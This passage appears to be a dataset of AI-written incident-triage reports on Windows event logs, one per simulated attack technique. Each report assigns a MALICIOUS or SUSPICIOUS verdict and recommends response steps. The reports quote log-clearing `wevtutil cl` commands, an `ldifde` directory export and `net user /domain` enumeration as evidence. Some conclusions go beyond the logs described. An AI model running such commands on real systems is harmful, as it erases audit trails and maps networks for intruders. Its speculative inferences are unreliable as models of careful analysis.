Overall, the combination of unauthorized log clearing, PowerShell invocation to download and run scripts from an unverified source, and the acquisition of elevated privileges by a user strongly suggests an Indicator of Compromise (IOC).

### Assessment: MALICIOUS

**Threats/Risks Identified**:
- Unauthorized activities facilitated by script execution from external sources.
- Potential privilege escalation and data manipulation/erasure by `admin_test`.
- Attempted obscuring of actions by clearing security logs.

**Guidance on How to Proceed**:
- Immediate containment of `Server002` to prevent further spread or damage.
- Conduct a comprehensive forensic investigation on `Server002` to identify the extent of the compromise.
- Review and reinforce security policies regarding script execution and privilege management.
- Re-assess network security measures, including monitoring and logging configurations.
- Notify relevant stakeholders and, if necessary, external agencies (e.g., cybersecurity bodies) about the potential breach."
System Network Connections Discovery with PowerShell,"Upon analyzing the provided Windows event logs, the following observations and analyses are made:

### Suspicious or Anomalous Behavior:

1. **Event Clearing:**
   - Multiple events indicate that the logs for the ""System,"" ""Windows PowerShell,"" and ""Security"" channels were cleared around the same time by the user `admin_test`.
   - **EventID 104 (System) and EventID 1102 (Security):** These indicate that the log file has been cleared. Log clearing is a common tactic used by attackers to cover their tracks after malicious activities have occurred.

2. **PowerShell Usage:**
   - There are PowerShell logs indicating the execution of the `Get-NetTCPConnection` command. While this command is not inherently malicious, frequent or unexpected use may indicate network reconnaissance, especially if executed by accounts not typically using PowerShell.
   - The PowerShell session was initiated by `admin_test`, who also cleared the logs.

3. **Wevtutil Usage:**
   - Logs indicate the use of `wevtutil.exe` for clearing event log channels such as ""System,"" ""Application,"" ""Security,"" and ""Windows PowerShell.""
   - Usage of `wevtutil.exe` to clear logs is unusual and can be an indicator of someone attempting to erase traces of activity.

4. **Time Manipulation:**
   - Security EventID 4616 indicates a change in system time. Time manipulation could be used to disrupt log timestamps or affect time-sensitive security controls.

### Malicious Activity or Compromise Indicators:

Based on the analysis, the log clearing events in conjunction with the use of `wevtutil.exe` and the `Get-NetTCPConnection` command, all executed by the user `admin_test`, point toward suspicious behavior that warrants further investigation. The combination of clearing multiple event logs and slight time manipulations is often associated with the cover-up activities post-compromise.

### Assessment and Guidance:

The logs show suspicious activities indicative of potential compromise:
- The clearing of event logs, especially the Security log, is indicative of potential malicious intent and attempts to hide unauthorized actions.
- Use of `wevtutil.exe` to clear logs paired with commands for network reconnaissance suggests possible intrusion or insider threat activity.
- The combination of actions carried out by the same user account (`admin_test`) within a short time frame is suspicious.

### Recommended Resolution:

**Resolution: SUSPICIOUS**

Given the observed activities, these logs contain suspicious behavior that requires further investigation. It is advised to:
- Review system access records for the `admin_test` account to determine any unauthorized access attempts or anomalies.
- Conduct a thorough audit of recent modifications or data access attempts on the system.
- Implement increased monitoring of critical systems to detect any further anomalies.
- If possible, restore logs from backups to analyze any potentially hidden malicious activity.
- Consider conducting a forensic analysis to determine the scope of potential compromise."
Port-Scanning -24 Subnet with PowerShell,"Upon reviewing the provided Windows event logs, I have identified some activities that warrant further investigation. Here's a detailed breakdown of the findings:

### Suspicious and Anomalous Behavior:

1. **Log Clearing Activity:**
   - **System Log ID 3565 & 3566, Security Log ID 30348:**
     - `wevtutil.exe` process is responsible for clearing the event logs for both the System and Windows PowerShell channels, and the user `admin_test` was involved.
     - This can be indicative of a potential malicious attempt to cover up traces of activities.

2. **Time Manipulation:**
   - **Security Log ID 30349 & 30350, System Log ID 3567 & 3568:**
     - The system time was adjusted backward. While there may be legitimate reasons for time changes, sudden or unexplained time adjustments could be used to evade certain types of logging or monitoring systems reliant on time synchronization.

3. **Unusual PowerShell Activity:**
   - **Sysmon Log ID 17960, PowerShell Log ID 1043-1049:**
     - A PowerShell script executed a network scan using the `Get-NetIPInterface` and `Get-NetIPAddress` cmdlets to enumerate network interfaces and perform a network scan for open ports (445, 3389) across a subnet. This type of reconnaissance activity is a common precursor for lateral movement within a network.

4. **Errors and Testing Behavior:**
   - Events from Sysinternals logs show the use of hostname and whoami commands during the same timeframe. This can be part of a script or manual recon activity performed by an attacker to understand more about the compromised system.

### Assessment:

- **Potential Indicators of Compromise:**
  - The clearing of logs and execution of a PowerShell script designed to perform network scanning suggests an attempt to maintain persistence or move laterally while evading detection.
  - The time manipulation could be used as a method to interfere with detection or auditing systems.

### Recommendations:

- **Immediate Actions:**
  - Investigate the account `admin_test` for any unauthorized access or privilege escalations. Review other systems where this account is used.
  - Review historical logs, if available, to identify activities leading to the log clearing and PowerShell execution.
  - Consider isolating the machine for a more detailed forensic investigation to prevent potential spread.

- **Preventative Measures:**
  - Implement stricter access controls and monitoring for administrative commands, e.g., `wevtutil.exe`.
  - Enable detailed PowerShell logging to capture all executed scripts and commands.
  - Set up automated alerts for suspicious activities like log clearing and backward time changes.

### Conclusion:
Based on the findings, the resolution is **MALICIOUS**. The activities, particularly log clearance and network scanning, strongly suggest an attempt at evasion and reconnaissance, typical in the early phases of an attack. Immediate actions should be taken to contain and remediate the potential impact on the system."
Get-WmiObject to Enumerate Domain Controllers,"After a thorough analysis of the provided event logs from the Windows host, several elements stand out that may indicate suspicious activity:

### Suspicious or Anomalous Behavior:
1. **Log Clearing Events:**
   - The logs indicate multiple events related to the clearing of event logs (Event IDs 104 for the System and Windows PowerShell channels, and Event ID 1102 for the Security channel) by the user ""admin_test"" on ""SERVER002"". This is considered suspicious as malicious actors often clear logs to cover their tracks after executing harmful activities.

2. **Console Host and Process Execution:**
   - There are multiple instances of the `wevtutil.exe` process being used to clear logs, executed by ""admin_test"". The `wevtutil` utility is legitimately used for managing Windows event logs but is also commonly abused by attackers to conceal their activities.
   - Additionally, a PowerShell script execution is observed involving `get-wmiobject` against an LDAP namespace which can be used for reconnaissance purposes.

3. **Time Change Events:**
   - There are events indicating changes in the system time which may correspond to Event ID 4616. Time changes without obvious legitimate purpose can be suspicious as they could be used to manipulate the timestamps on logs or other evidence.

### Assessment of Potential Malicious Activity:
- **Malicious Intent Indications:**
  The activities of clearing event logs in quick succession under the account ""admin_test"" and executing scripts related to potentially gathering information through PowerShell generally point towards behavior often associated with malicious activity. The additional presence of privilege-related rights assignments on the same user account further amplify suspicion.

### Clarification of Risks:
- While the clearing of logs alone doesn't confirm a compromise, when correlated with suspicious use of PowerShell and privilege configurations, these actions pose a significant security risk. It suggests an attempt to hide tracks following potentially unauthorized or malicious access.

### Recommended Actions:
1. **Conduct Further Investigation:**
   - Validate if the user ""admin_test"" was legitimately executing these actions. Verify with the user or the associated department if there was any routine administrative task that required log clearance on this specific date.

2. **Audit User Activity:**
   - Review other systems for similar activities by the same user, particularly any network-based reconnaissance or lateral movement.

3. **Enhance Monitoring:**
   - Implement tighter monitoring on privileged accounts and increase logging for actions such as log clearance or account privilege changes.

4. **Restrict Privileges:**
   - Assess the necessity of all privileged rights assigned to ""admin_test"" and restrict where applicable to minimize risk. 

5. **Consider Incident Response:**
   - If unauthorized activity is suspected, initiate a formal incident response to explore the full extent of the compromise.

### Final Assessment:
Given the combination of log clearance, potential reconnaissance activity through PowerShell, and associated privilege escalations, the logs should be classified as **MALICIOUS**. These activities need immediate attention and verification to ensure that there is no ongoing threat to the system or network."
Security Software Discovery - Windows Firewall Enumeration,"After analyzing the provided Windows event logs, the following observations were made:

### Suspicious or Anomalous Behavior

1. **Log Clearing Activity:**
   - A series of log entries indicating the clearing of logs by the user `admin_test` across different channels: System, Windows PowerShell, and Security.
   - Cleared logs could imply an attempt to hide activities, which is typically suspicious.

2. **Unexpected Use of `wevtutil`:**
   - The utility `wevtutil.exe` is being used to clear logs (`cl` command) for multiple channels: System, Windows PowerShell, and Security.
   - This tool is commonly leveraged by attackers to cover their tracks due to its capability of clearing event logs.

3. **Frequent Use of Admin Credentials for Automated Tools:**
   - Several administrative-level processes (`wevtutil.exe`, `wsmprovhost.exe`) initiated by the `admin_test` account. 
   - The activity seems highly clustered around a single timeframe, which could indicate a script or automated execution rather than standard user behavior.

4. **Use of PowerShell:**
   - Execution of PowerShell with commands related to gathering firewall settings. While benign on its own, in conjunction with log clearing activities, it might be part of a reconnaissance phase of an attack.

5. **Multiple Instances of Short-lived Commands:**
   - Execution of commands like `whoami.exe` and `hostname.exe` by the same admin account could suggest enumeration activities, commonly a precursor or part of malicious operations.

### Potential Indicators of Malicious Activity

- The combination of clearing logs, enumeration via `whoami.exe` and firewall settings checks through PowerShell, indicates a strong suspicion of malicious intent.
- The nature of the commands (log clearing and system enumeration) aligns with general tactics used by adversaries to maintain persistence while avoiding detection.

### Assessment and Resolution

Overall, the activities observed in the event logs suggest a pattern consistent with potential malicious operations. While there is no 100% definitive evidence of compromise, the intention to cover tracks and perform system enumeration strongly leans towards suspicious activity that is often associated with compromise. 

**Resolution: SUSPICIOUS**

### Recommendations and Guidance

- **Immediate Actions:**
  - Investigate the `admin_test` account further for any unauthorized changes or access.
  - Review system access policies and ensure appropriate access controls are in place for administrative accounts.

- **Enhanced Monitoring:**
  - Increase monitoring on the affected host for further suspicious activities or any signs of data exfiltration.
  - Implement alerting for log clearing activities or unusual process executions involving administrative accounts.

- **System and Network Hardening:**
  - Revoke or reset credentials for potentially affected accounts.
  - Consider implementing tighter access controls and better segmentation to limit the potential impact of compromised accounts.

- **Incident Response Assessment:**
  - Determine if a broader compromise could have occurred within the network.
  - Engage with a forensic analyst to conduct a deeper investigation if necessary.

These steps should help ascertain the full extent of the suspicious activities and mitigate further risks."
Adfind - Enumerate Active Directory OUs,"Based on the log entries provided, there are several elements that stand out as suspicious or indicative of potentially malicious activity:

1. **Event Log Clearing**: 
   - Security Event ID 1102 and System Event ID 104 indicate that logs have been cleared. This is a common technique used by attackers to cover their tracks on a compromised system. The logs show that an account ""admin_test"" was used to clear logs from multiple channels, which is highly suspicious, especially since this action occurred in quick succession.
   
2. **Command-Line Activity**:
   - The presence of the `wevtutil` utility being executed multiple times (`cl` command) with the intent to clear various logs, including Sysmon, Application, and System logs, suggests an attempt to hide activities.
   
3. **Execution of Known Tools**:
   - The `cmd.exe` process executed a command referencing ""AdFind.exe,"" a known tool often used in post-exploitation phases for Active Directory reconnaissance.

4. **Unusual Process Execution and Elevated Privileges**:
   - The excessive use of Sysmon logs and use of high privilege processes like `SecurityHealthService.exe`, `wevtutil.exe`, and repeated execution of `MicrosoftEdgeUpdate.exe` with command-line arguments like `/svc`, `/regsvc`, `/regserver`, and `/ua`, which reflect installation and registration tasks for Microsoft Edge Update but in a heightened frequency which can be normal but stands out due to the frequency and suspicious timing around the log clearance events.
   
5. **Administrator-Simulated Actions by `admin_test`**:
   - The usage of the ""admin_test"" account with several high privileges, and its activity pattern, including clearing logs and executing suspicious command lines, strongly suggests potential misuse of an administrative account.

Based on the analysis of these log entries, the activity observed is consistent with patterns observed in post-exploitation scenarios where an attacker might perform reconnaissance, use tools like AdFind, and attempt steps to obfuscate their presence, such as log clearing.

### Final Assessment: MALICIOUS

**Recommendations**:
1. Immediately contain and isolate the system (Server002) for further forensic investigation.
2. Change credentials for all accounts, especially ""admin_test"", and possibly other admin accounts in the domain.
3. Review network traffic logs around the time of the incidents for unusual activity.
4. Conduct a full assessment of other systems in the network for signs of similar patterns, indicating lateral movement.
5. Implement stricter monitoring and alerting mechanisms to detect similar activities going forward."
Extract Edge Browsing History,"Upon analyzing the provided Windows event logs, I identified several behaviors, out of which the following stand out as potentially suspicious:

1. **Event Log Clearing**: There are multiple instances of event log clearing, as evidenced by the Event ID 1102 in the security logs and Event ID 104 in the system logs. The user `admin_test` initiated these log clearings, notably affecting the Security, System, and Windows PowerShell channels.

2. **Use of `wevtutil` for Event Log Clearing**: In the Sysmon logs, there are several instances of the `wevtutil.exe` command being executed with the command line indicating the clearing of various event logs (`cl` command). This matches the Event IDs observed in the Security and System logs, suggesting that the logs were cleared programmatically.

3. **Suspicious PowerShell Activity**: The PowerShell log and Sysmon log indicate the execution of a PowerShell command that extracts browsing history from Microsoft Edge and writes it to a file located at `$Env:USERPROFILE\Downloads\edgebrowsinghistory.txt`. This action suggests possible data exfiltration or at the very least, an unusual behavior that warrants further investigation.

4. **Time Synchronization Events**: There are multiple instances of time changes and synchronization events around the same timestamp. While not inherently malicious, this could indicate an attempt to alter system timestamps to hide other activities.

5. **Frequent Execution of System Processes**: The presence of default Windows utilities like `whoami.exe` and `HOSTNAME.EXE`, executed in close succession with no apparent reason, is typically indicative of enumeration or reconnaissance activity. This is corroborated by their parent processes, which are processes like `wsmprovhost.exe`, indicating remote management activities.

### Assessment:
The activity logs suggest a concerning pattern of behavior that can be categorized as potentially malicious or suspicious. The clearing of logs is particularly notable, as this is a technique often employed by attackers to cover their tracks. Additionally, the activity related to data extraction via PowerShell suggests potential unauthorized data access or exfiltration.

### Resolution: SUSPICIOUS

While the logs don't provide conclusive evidence of a full compromise, the combination of log clearing, suspicious command executions, and potential data exfiltration justifies further investigation. It's essential to review user accounts, examine additional logs for further context, and consider whether access restrictions or user actions deviate from standard operating procedures.

### Guidance on How to Proceed:
1. **User Account Review**: Investigate the actions and legitimacy of the user account `admin_test`, including login history, access patterns, and any unusual privileges.

2. **Endpoint Monitoring**: Implement enhanced monitoring on the affected endpoint to track any further suspicious activity, focusing on process creations and network communications.

3. **Data Exfiltration Verification**: Check for any outbound connections or unusual transfers correlated with the suspicious PowerShell activity.

4. **Forensic Analysis**: If possible, perform forensic analysis on the host, focusing on file modifications, timeline analysis, and searching for artifacts consistent with intrusion activity.

5. **Patch and Update**: Ensure the system is patched and up-to-date to minimize vulnerabilities exploited by attackers.

6. **User Education**: Reinforce security awareness training with focus on secure use of administration tools and recognizing potential signs of compromise.

Taking these precautionary and investigative steps can help ascertain the nature of the logged events and mitigate potential threats."
Process Discovery - Get-Process,"Upon analyzing the provided logs, several indicators potentially pointing towards suspicious or malicious activity were observed:

### Analysis of Observed Events:

1. **Event Log Clearing:**
   - There are multiple instances of the event with Event ID 104 indicating that logs were cleared. Specifically, the logs from ""System"" and ""Windows PowerShell"" were cleared by the user ""admin_test"". Such activity can suggest an attempt to cover tracks, which is a common tactic used in malicious activities.

2. **Wevtutil Usage:**
   - Sysmon logs show multiple executions of `wevtutil.exe`, a command-line tool for managing Windows event logs. The `cl` command was used, which clears log entries (`wevtutil.exe cl System`, `wevtutil.exe cl Application`, and `wevtutil.exe cl Security`). This coincides with the event log clearing and further suggests malicious intentions.

3. **Privilege Escalation:**
   - Security logs show that the user ""admin_test"" acquired multiple high-level privileges (SeSecurityPrivilege, SeBackupPrivilege, etc.). This is recorded in Event ID 4672 entries. The accumulation of such high privileges, especially when followed by log clearing, is suspicious and requires further investigation.

4. **Time Change Events:**
   - There are multiple Event ID 4616 entries indicating time changes on the system. Changing the system time can be used to manipulate timestamp-based security mechanisms or log entries. Although not conclusively malicious, it is often associated with obfuscation techniques.

5. **Presence of PowerShell Activities:**
   - The Windows PowerShell logs indicate that PowerShell was used (`powershell.exe & {Get-Process}`). It shows activity within the context of `admin_test`. While Get-Process is benign, any unexpected or suspicious use of PowerShell—especially following a cleared log—warrants deeper scrutiny.

### Conclusion:

Based on the evidence, there are clear signs of suspicious activities:
- Simultaneous log-clearing events for key logs (System, Application, Security, and PowerShell).
- Execution of `wevtutil.exe` with arguments that clear logs, aligning with the log clear events.
- Elevation of privileges by ""admin_test"" aligning with typical attack vectors for persistence and data manipulation.
- System time modifications, potentially used to disguise actions.

Given the sequence and combination of these events, the situation aligns with a potential compromise, especially considering the log-clearing behavior meant to cover tracks.

### Final Resolution:
- **Resolution:** MALICIOUS

### Guidance:
- Conduct a thorough investigation into the activities of the user ""admin_test."" Verify if the user actions were sanctioned and whether credentials were compromised.
- Examine system changes and identify if other systems were affected.
- Consider enabling additional monitoring or integrating a more robust SIEM solution to capture similar events in the future.
- Inform management and, if necessary, evoke incident response protocols to mitigate further unauthorized activities."
Active Directory Enumeration with LDIFDE,"Upon analyzing the given Windows event logs, the following suspicious and potentially malicious activities were identified:

1. **Log Clearance**:
   - **Security Log Clearance**: EventID 1102 indicates that the security logs were cleared by the user `admin_test` on `Server002`. Clearing security logs is a common practice by attackers to cover their tracks, especially if done outside of regular log maintenance tasks.
   - **System Log Clearance**: EventID 104 shows that the system logs were also cleared by the same user. This further strengthens the likelihood of intentional log clearance to hide activity.
   - **Windows PowerShell Log Clearance**: EventID 104 signifies that PowerShell logs were cleared. PowerShell is often used in malicious activities to execute scripts or commands without detection, and clearing its logs could suggest illicit use.

2. **Process Creation and Execution**:
   - The execution of `wevtutil.exe` with the command-line arguments to clear event logs (""`cl Microsoft-Windows-Sysmon/Operational`"", ""`cl Application`"", ""`cl System`"", ""`cl Security`"", ""`cl Windows PowerShell`"") repeatedly by the user `admin_test` is logged. This behavior indicates an intention to systematically cleanse event logs across various channels, suggestive of hiding tracks.

3. **Use of Tools Indicative of Host Reconnaissance**:
   - The execution of `whoami.exe`, along with `cmd.exe`, with unusual command-line arguments is observed (`ldifde.exe -f C:\\Windows\\temp\\atomic_ldifde.txt -p subtree`). Such a command might be used for exporting directory information, which could indicate preparation for lateral movement or data exfiltration.

4. **Presence of Elevated Privileges**:
   - Events showing `SYSTEM` privileges are recurring (EventID 4672), giving users extensive control and access within the system, which may point to privilege escalation. `admin_test` has been using high integrity and elevated tokens during these operations, raising further concerns.

Combining these observations, it appears that there might have been an intentional cleanup of event logs to hide potentially unauthorized actions, leveraged through elevated privileges, possibly indicating reconnaissance and preparation for further malicious activity within the host.

### Conclusion: MALICIOUS

The activities captured in the logs, including the systematic clearance of logs across multiple channels, the use of event log management utilities, execution of reconnaissance commands, and actions performed with elevated privileges, strongly suggests a malicious intent to conceal unauthorized operations and potentially compromise the host.

### Guidance on Proceeding:

1. **Immediate Incident Response**: Initiate an incident response process to contain and investigate the breach.
2. **Account Review and Revocation**: Review the actions and privileges of the `admin_test` account and consider revoking and resetting credentials.
3. **Log Retention and Monitoring**: Ensure an off-system log archive to prevent local log clearance. Enhance monitoring alert mechanisms for similar heuristic patterns in the future.
4. **Forensic Analysis**: Conduct a forensic investigation to trace back the origin of commands executed and any other potential compromised systems within the network.
5. **System Review and Hardening**: Review system configurations, privileges, and policies to fortify against similar attacks."
Adfind - Enumerate Active Directory Domain Controller Objects,"After a thorough analysis of the provided Windows event logs, there are several points that stand out as anomalous and potentially suspicious activities:

1. **Log Clearing Events**: The system log contains multiple instances of Event ID 104 from `Microsoft-Windows-Eventlog`, which indicates that event logs in various channels (System, Windows PowerShell) have been cleared by the user `admin_test`. This is often considered a suspicious activity because attackers may clear logs to erase their traces post-attack.

2. **Use of wevtutil.exe**: The Sysmon logs show multiple instances of executions of `C:\Windows\System32\wevtutil.exe` with the `cl` command, which clears logs. This behavior, especially when seen in sequence with log clearing events, bolsters the possibility of malicious activity.

3. **Execution of Potentially Suspicious Commands**: The Sysmon log records the execution of `cmd.exe` with the command line indicating the use of  `AdFind.exe`, which is a legitimate tool often used by attackers to gather information about Active Directory. The presence of this command under the user `SERVER002\admin_test`, running with high integrity, is suspicious without legitimate work purposes.

4. **Security Event Log**: There is an Event ID 1102 in the Security log, which indicates the Security audit log was cleared. This is critically suspicious as attackers attempt to erase evidence of their actions by clearing logs.

5. **Presence of Common System Tools**: The logs show executions of various Windows system utilities such as `whoami.exe`, `hostname.exe`, and `taskhostw.exe`. While these are legitimate tools, their presence together with the above events is consistent with reconnaissance by a malicious actor. The execution pattern suggests activities typical in post-exploitation scenarios.

**Conclusion**:
Based on the findings, the activities in the log indicate potential malicious actions. The clearing of event logs, command executions involving tools like `AdFind.exe`, and the execution sequence of reconnaissance-oriented tools suggest a deliberate attempt to compromise system integrity and possibly acquire sensitive information.

**Resolution**: MALICIOUS

**Guidance on How to Proceed**:
- Immediate escalation to the incident response team is recommended.
- Investigate the timeline and scope of `admin_test` user activities; consider changing passwords or disabling the account temporarily.
- Perform a forensic analysis of the server to identify other potentially compromised areas.
- Review network activity from Server002 for any unusual outgoing connections.
- Check for the installation of backdoors or unauthorized software.
- Reinforce security logging and monitoring capabilities to capture such activities in the future."
Enumerate Default Domain Admin Details (Domain),"Upon analyzing the provided Windows event logs, there are several points of concern that indicate potentially malicious behavior.

### Analysis:

1. **Clearing of Event Logs**: 
   - Events 1102 in the Security log and 104 in the System log indicate that the event logs were cleared. This action, especially when performed without a clear administrative purpose, is suspicious as attackers often clear logs to cover their tracks.
   - The user associated with these actions is ""admin_test"" (SID: S-1-5-21-3962163828-2803415714-1403596700-1006), which shows these actions were initiated under this account.

2. **High Privilege Use**:
   - Event 4672 indicates that the account ""admin_test"" was granted privileges such as SeDebugPrivilege, SeTakeOwnershipPrivilege, and SeImpersonatePrivilege among others. These are powerful privileges typically not used frequently in day-to-day operations and known for being exploited for post-exploitation activities by attackers.
   
3. **Execution of `wevtutil.exe`**:
   - The Sysmon logs show multiple executions of `wevtutil.exe` clearing various event logs including Sysmon, Application, System, and Security channels in quick succession. This is highly indicative of an attempt to remove tracks of activities on a compromised system.

4. **Execution of `cmd.exe` and `net.exe`**:
   - Sysmon logs show a `cmd.exe` process executing command `net user administrator /domain`, which suggests enumeration of domain user accounts. Post-exploitation frameworks often leverage such commands for reconnaissance.

5. **Frequent Process Creation by `admin_test`**:
   - Numerous processes were spawned under the ""admin_test"" account in the Sysmon logs, which are notably aggressive in terms of their quantity and scope within a short timeframe.

6. **PowerShell and other high-integrity activities**:
   - Although not explicitly visible in logs, certain PowerShell activities would complement the malicious script execution approach.

### Assessment:

The activities logged in the provided events logs point towards malicious behavior. The sequence of event logs being cleared, high privileges being used, and log manipulations through `wevtutil.exe`, along with the typical reconnaissance command using `cmd.exe` suggest an attacker is trying to maintain persistence and cover their tracks after potentially malicious actions.

### Resolution: MALICIOUS

### Guidance on how to proceed:

- **Immediate Action**:
  - Isolate the host ""Server002"" from the network to prevent further potential lateral movement by the attacker.
  
- **Forensic Analysis**:
  - Collect and analyze a full disk image and volatile memory of ""Server002"" for further evidence and root cause analysis.

- **Review Administrative Access**:
  - Investigate how the ""admin_test"" account was potentially compromised and review all administrative-level accesses on the network.

- **Log Monitoring**:
  - Implement more aggressive logging and alerting for event log clearing and execution of high-privilege commands to quickly detect repeat attempts.

- **Security Measures**:
  - Ensure that all systems have updated security patches and consider introducing advanced endpoint detection and response (EDR) solutions to better detect similar activities in the future.

By taking these steps, the organization can better understand the scope of the compromise and protect against future incidents."
System Network Configuration Discovery (TrickBot Style),"After analyzing the provided Windows event logs, I identified several instances of potentially suspicious or anomalous activity:

1. **Event Clearing:** 
   - There are multiple instances of the `wevtutil.exe` command being used to clear Windows event logs. Notably, the `Security`, `System`, and `Windows PowerShell` logs were cleared by the user `admin_test` (Event IDs 104 and 1102).
   - Clearing event logs is a classic sign of an attempt to cover tracks after malicious activities. While there could be legitimate reasons for this, it often warrants further investigation.

2. **Privilege Escalation / Use of Elevated Privileges:**
   - Event ID 4672 shows that user `admin_test` had special privileges granted, including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, `SeBackupPrivilege`, and others. These privileges enable the user to perform tasks that are sensitive and should be monitored.

3. **Suspicious Command-Line Execution:**
   - Sysmon logs show command-line executions that include network reconnaissance commands (`cmd.exe` with `ipconfig`, `net view`, `nltest`). This could suggest the user was trying to gather network information, which might not be typical for a regular user's operations.

4. **Failed Token Acquisitions:**
   - Event ID 5379 indicates repeated failed attempts at accessing tokens using the `MicrosoftAccount:user` and `WindowsLive` services. This might suggest attempted unauthorized access.

5. **Multiple Edge Installer Events:**
   - There are numerous Sysmon events related to Microsoft Edge's installer (`setup.exe`). While updating software is typically benign, the volume and frequency might imply the use of an installer to deliver payloads if it wasn’t initiated by a legitimate update process.

6. **Administration Logons from Remote Systems:**
   - Event ID 4624 shows logon types that indicate network logons. Specifically, the user `admin_test` logged in from a remote machine `DESKTOP-3HL5B2P`. This should be confirmed as legitimate activity.

Based on the analysis of the logs, the observed activities point towards potential malicious actions, especially considering the log clearance attempts, possible privilege usage, and suspicious command executions. Therefore, my assessment of the situation is:

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- **Investigate the user `admin_test`:** Verify if the actions taken by this user were authorized and part of normal operating procedures.
- **Audit the use of `wevtutil.exe`:** Determine the context under which the event logs were cleared and for what purpose.
- **Review network activity:** Check for unauthorized access, especially from the machine `DESKTOP-3HL5B2P`.
- **Verify software installations:** Ensure that all Microsoft Edge installer activities are legitimate and part of normal update processes.
- **Closer inspection of privileges:** Look into the necessity and usage of the elevated privileges granted to `admin_test`. 

Further investigation is warranted to determine the legitimacy of these activities and ensure the security of the system."
Launch DirLister Executable,"After reviewing the provided log entries spanning various Windows event channels, here's a detailed analysis of the activity:

### Analysis:

1. **Log Clearing Events:**
   - The System and Security logs contain entries indicating that event logs for both the `System` and `Windows PowerShell` channels have been cleared (`EventID: 104` and `EventID: 1102` respectively). This is often a red flag as such actions could indicate an attempt to cover tracks after unauthorized or suspicious activity.
   - The user `admin_test` appears to have performed these actions, which aligns with possible unauthorized access or intentional log manipulation.

2. **PowerShell Execution:**
   - Multiple events show the execution of PowerShell (`powershell.exe`) with unusual command lines involving the execution of `DirLister.exe` from a temporary directory, `C:\Users\ADMIN_~1\AppData\Local\Temp\ExternalPayloads\`. This suggests that PowerShell was used to execute external payloads, which is a common tactic in advanced persistent threats and malware deployment.
   - `DirLister.exe` is executed, then stopped after a 4-second sleep command, hinting at an automated or scripted behavior. Additionally, this executable is located in a temporary directory, which is atypical for legitimate applications.

3. **Sysmon Logs:**
   - There are entries showing the clearing of various event logs using `wevtutil.exe`, executed by the `admin_test` user. The sequence of these commands (`wevtutil cl Microsoft-Windows-Sysmon/Operational`, etc.) corroborates with the observed log clearing events in the Windows native logs.
   - The presence of hashing (SHA256) along with high integrity level settings suggests the processes were executed with elevated privileges.

4. **Edge Update Activity:**
   - There is an abundance of Microsoft Edge update processes (`MicrosoftEdgeUpdate.exe`) occurring around the same timeframe. While frequent updates by Edge Update processes are not inherently suspicious, such timing with other questionable activities necessitates further scrutiny to rule out potential threats linked via masquerading or malicious updates.

### Assessment:

Given the evidence of log clearance, unauthorized command execution through PowerShell, and the unusual command line activities associated with temporary payloads, there are significant indicators of possible unauthorized access or malicious activity.

### Conclusion:

The resolution is **MALICIOUS** due to:
- Log deletion behavior indicating an attempt to hide tracks.
- PowerShell scripts executing from temporary directories with non-standard applications (`DirLister.exe`).
- Elevated privileges being used to execute suspicious commands.

### Recommendations for Proceeding:

- **Immediate Containment:** Disable or isolate the affected account (`admin_test`) and the host (Server002) for deeper investigation.
- **Detailed Forensic Analysis:** Perform a forensic audit on the server to identify further signs of compromise, including inspecting any file changes, registry key modifications, and network activity.
- **Review User Permissions:** Audit the permissions and access controls for the `admin_test` account to understand whether these actions could have been performed within its intended permissions or if there was privilege escalation.
- **Review and Update Security Measures:** Enhance monitoring, apply security patches, and enforce more stringent access controls to prevent future incidents.

Implementing these steps can mitigate the risk of further malicious activity and help identify the root cause of this compromise."
Azure Security Scan with SkyArk,"Upon analyzing the provided Windows event logs, there are notable patterns indicative of potentially malicious activity. Let's break down the findings:

### Suspicious and Anomalous Behavior:
1. **PowerShell Execution**: The Windows PowerShell log entries show that a PowerShell script `AzureStealth.ps1` was executed using command-line parameters that connect to Azure accounts using stored credentials:
   - The script is located in a suspicious path involving temporary directories and `ExternalPayloads` which are typically leveraged by adversaries to store payloads for execution.
   - The use of `ConvertTo-SecureString` with the `-AsPlainText` flag for credential handling is considered a poor security practice, often seen in scripting during unauthorized access attempts.

2. **Event Log Clearing**: 
   - From the system and security logs, events indicate that logs for the System, Windows PowerShell, and Security channels were cleared (`EventID: 104` in System and `EventID: 1102` in Security). This action is a strong indicator of malicious activity, as attackers often clear logs to cover their tracks.
   
3. **High Privilege Activity**:
   - The security log (`EventID: 4672`) shows granting of high privileges (like `SeDebugPrivilege`, `SeBackupPrivilege`, etc.) which can be indicative of privilege escalation or preparation for exfiltration where high permissions are needed.

4. **Sysmon Entries**:
   - Several `wevtutil.exe` processes are observed. This utility can be used for legitimate purposes, but in this context, it aligns with log clearing actions which reinforce the malicious intent.
   - Execution of scripts like `AzureStealth.ps1` with tools like `csc.exe` (C# compiler) and processes related to system updates (`MoUsoCoreWorker.exe`) may have been manipulated as part of a persistence mechanism.

### Assessment:
Based on the logs and activities identified:
- The use of suspicious PowerShell scripts.
- Log clearing activities.
- Elevated privileges and potential privilege escalation.
- Processes interacting unusually with the .NET Framework (like `csc.exe`).

All these point towards intentional and possibly unauthorized uses which match patterns seen in infiltrations or reconnaissance phases of an attack.

### Resolution: MALICIOUS

### Guidance on How to Proceed:
1. **Immediate Isolation**: Isolate the affected host (Server002) from the network to prevent further lateral movement or exfiltration.
2. **Incident Response Engagement**: Engage the incident response team to conduct a thorough investigation, including memory analysis and a deeper network traffic review.
3. **Credential Review**: Immediately review and reset credentials, especially those tied to Azure and administrative accounts.
4. **Log Reviews and Hardenings**: Ensure complete logging is enabled and external attempts at clearing them are mitigated through additional security policies.
5. **System Audit**: Conduct a full audit of systems for other potential compromisers, including reviewing other hosts for similar activities or the presence of the same scripts.
6. **Security Patch**: Ensure all systems are updated with the latest security patches to mitigate the exploitation of known vulnerabilities.
7. **Review and Remediation**: Analyze any existing security practices and tighten controls around PowerShell and script execution policies.

Given the evidence, a full-scale investigation followed by strategic remediation is crucial to mitigate risks from this incident."
System Discovery - SocGholish whoami,"Upon reviewing the provided logs, several observations indicate that further investigation is warranted due to suspicious activity.

### Key Observations:
1. **Event Clearing:**
   - The logs indicate multiple instances where logs were cleared using the `wevtutil` command. This action is suspicious, especially considering it was performed on Security, Application, and System logs. Specifically, the events were cleared by a user named `admin_test` with high integrity level access, which raises concerns about potential attempts to cover tracks.

2. **PowerShell Script Execution:**
   - The PowerShell logs reveal the execution of a script involving randomized string generation and calling `whoami.exe /all`, redirecting the output to a temporary file. This behavior is atypical for routine administrative tasks and could be part of reconnaissance or privilege escalation efforts.

3. **Repeated Credential Access Attempts:**
